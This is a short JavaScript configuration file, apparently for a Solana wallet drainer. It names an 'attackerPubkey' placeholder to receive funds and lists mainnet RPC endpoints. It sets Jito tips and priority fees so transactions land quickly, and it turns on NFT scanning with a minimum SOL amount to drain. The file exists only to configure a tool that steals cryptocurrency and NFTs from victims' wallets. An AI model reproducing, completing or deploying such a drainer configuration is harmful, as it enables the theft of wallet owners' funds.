export default {
  attackerPubkey: "YOUR_SOLANA_ADDRESS_HERE",

  rpcEndpoints: [
    "https://api.mainnet-beta.solana.com",
    "https://rpc.ankr.com/solana",
  ],

  // These properties MUST exist (fixing builder errors)
  priorityFeeMicroLamports: 12000,
  jitoTipAmount: 60000,
  maxInstructionsPerTx: 10,
  delayBetweenTx: 420,
  maxRetriesPerTx: 3,

  jitoEnabled: true,
  scanNFTs: true,
  minSolToDrain: 0.008,
};